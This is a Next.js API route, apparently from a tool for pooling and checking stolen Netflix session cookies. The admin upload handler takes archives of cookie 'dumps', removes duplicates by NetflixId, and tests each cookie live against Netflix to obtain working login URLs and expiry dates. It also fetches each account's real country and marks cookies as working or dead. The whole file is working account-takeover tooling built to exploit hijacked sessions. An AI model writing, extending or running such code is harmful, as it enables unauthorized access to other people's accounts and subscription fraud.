import { NextResponse } from "next/server";
import { verifyAdmin } from "@/lib/auth";
import { extractCookiesFromArchive } from "@/lib/archive";
import { extractCookieDict } from "@/lib/cookies";
import { netflixIdPreview } from "@/lib/mask";
import { fetchNftoken, ClientError } from "@/lib/client";
import { poolAdd, poolList, type PoolEntry } from "@/lib/pool";
import { fetchRealCountry } from "@/lib/country";

export const runtime = "nodejs";
export const dynamic = "force-dynamic";
export const maxDuration = 60;

const MAX_ARCHIVE_BYTES = 10 * 1024 * 1024; // 10 MB for admin uploads

function makeId(): string {
  try {
    return crypto.randomUUID();
  } catch {
    return Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
  }
}

/** POST /api/admin/upload — upload a .zip or .rar archive to the pool. */
export async function POST(request: Request) {
  if (!verifyAdmin(request)) {
    return NextResponse.json({ error: "Unauthorized." }, { status: 401 });
  }

  let formData: FormData;
  try {
    formData = await request.formData();
  } catch {
    return NextResponse.json(
      { error: "Expected multipart/form-data with a 'file' field." },
      { status: 400 },
    );
  }

  const file = formData.get("file");
  if (!file || !(file instanceof Blob)) {
    return NextResponse.json({ error: "No file uploaded." }, { status: 400 });
  }
  if (file.size > MAX_ARCHIVE_BYTES) {
    return NextResponse.json(
      { error: `File too large (max ${MAX_ARCHIVE_BYTES / 1024 / 1024} MB).` },
      { status: 413 },
    );
  }

  let extracted: { source: string; cookie: string; label: string; country?: string }[];
  try {
    const buffer = await file.arrayBuffer();
    extracted = await extractCookiesFromArchive(buffer);
  } catch (err) {
    return NextResponse.json(
      { error: "Failed to extract: " + (err instanceof Error ? err.message : String(err)) },
      { status: 422 },
    );
  }

  if (extracted.length === 0) {
    return NextResponse.json(
      { error: "No cookies found in the archive." },
      { status: 422 },
    );
  }

  // Deduplicate against existing pool entries.
  const existing = new Set(
    poolList().map((e) => extractCookieDict(e.raw)["NetflixId"]).filter(Boolean),
  );

  const fresh = extracted.filter((c) => {
    const id = extractCookieDict(c.cookie)["NetflixId"];
    return id && !existing.has(id);
  });

  if (fresh.length === 0) {
    return NextResponse.json({
      added: 0,
      total: extracted.length,
      skipped: extracted.length,
      message: "All cookies already exist in the pool.",
    });
  }

  // Verify cookies concurrently with bounded concurrency
  const results: PoolEntry[] = [];
  const concurrency = 5;
  let cursor = 0;

  async function checkWorker() {
    while (cursor < fresh.length) {
      const idx = cursor++;
      const c = fresh[idx];
      const entry: PoolEntry = {
        id: makeId(),
        label: c.label || "",
        source: c.source,
        country: c.country,
        raw: c.cookie,
        preview: netflixIdPreview(c.cookie),
        status: "unchecked",
        addedAt: Date.now(),
      };

      try {
        const dict = extractCookieDict(entry.raw);
        const result = await fetchNftoken(dict);
        entry.status = "working";
        entry.loginUrl = result.login_url;
        entry.expires = result.expires;
        entry.expiryText = result.expiry_text;
        entry.lastChecked = Date.now();

        // If no country was in the dump text, live-fetch the REAL account country from Netflix
        if (!entry.country) {
          const real = await fetchRealCountry(entry.raw, entry.source, entry.loginUrl);
          if (real) entry.country = real;
        }
      } catch (err) {
        const isClient = err instanceof ClientError;
        entry.status = isClient ? "invalid" : "error";
        entry.message = err instanceof Error ? err.message : String(err);
        entry.lastChecked = Date.now();
      }

      results.push(entry);
      poolAdd(entry);
    }
  }

  await Promise.all(
    Array.from({ length: Math.min(concurrency, fresh.length) }, () => checkWorker()),
  );

  const working = results.filter((r) => r.status === "working").length;
  const dead = results.filter((r) => r.status === "invalid").length;

  return NextResponse.json({
    added: results.length,
    working,
    dead,
    total: extracted.length,
    skipped: extracted.length - fresh.length,
    entries: poolList(),
  });
}
